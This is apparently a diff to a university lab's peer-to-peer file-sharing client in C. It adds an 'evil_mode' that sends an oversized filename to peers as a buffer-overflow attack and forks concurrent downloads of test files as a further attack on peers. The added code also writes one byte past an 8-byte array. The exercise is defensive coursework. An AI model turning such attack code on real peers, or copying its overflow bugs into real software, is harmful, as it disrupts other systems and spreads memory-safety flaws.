@@ -550,6 +550,22 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
+	
+	// Security Attack: attempt buffer overflow
+	if (evil_mode == 1) {
+		message("* Attacking with filename buffer overflow\n");
+
+		// create buffer overflow input
+		char overflow[FILENAMESIZ * 2];
+		memset(overflow, 1, FILENAMESIZ*2);
+
+		// send input
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", overflow);
+
+		// attempt with other peers
+		// goto try_again;
+	}
+	
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Open disk file for the result.
@@ -641,6 +657,7 @@ static task_t *task_listen(task_t *listen_task)
 	int fd;
 	task_t *t;
 	assert(listen_task->type == TASK_PEER_LISTEN);
+	char* file[8];
 
 	fd = accept(listen_task->peer_fd,
 		    (struct sockaddr *) &peer_addr, &peer_addrlen);
@@ -748,6 +765,8 @@ int main(int argc, char *argv[])
 	char *s;
 	const char *myalias;
 	struct passwd *pwent;
+	int i;
+	char file[8];
 
 	// Default tracker is read.cs.ucla.edu
 	//osp2p_sscanf("131.179.80.139:11111", "%I:%d",
@@ -817,6 +836,29 @@ int main(int argc, char *argv[])
 	listen_task = start_listen();
 	register_files(tracker_task, myalias);
 	prev_task = NULL;
+
+	// Security Attack: begin downloader attacks in concurrent processes
+	if (evil_mode == 1) 
+	{
+		strncpy(file, "cat0.jpg", 8);
+		file[8] = '\0';
+		// iterate through all three test files
+		for (i = 1; i <= 3; i++) 
+		{
+			file[3]++;
+			if ((t = start_download(tracker_task, file))) 
+			{
+				pid = fork();
+				if (pid == 0) 
+				{
+					task_download(t, tracker_task);
+					exit(0);
+				}
+				else if (pid < 0)
+					error("* Fork error while starting downloader attack.\n");
+			}
+		}
+	}
 
 	// First, download files named on command line.
 	//Exercise 1 - Parallel Downloads
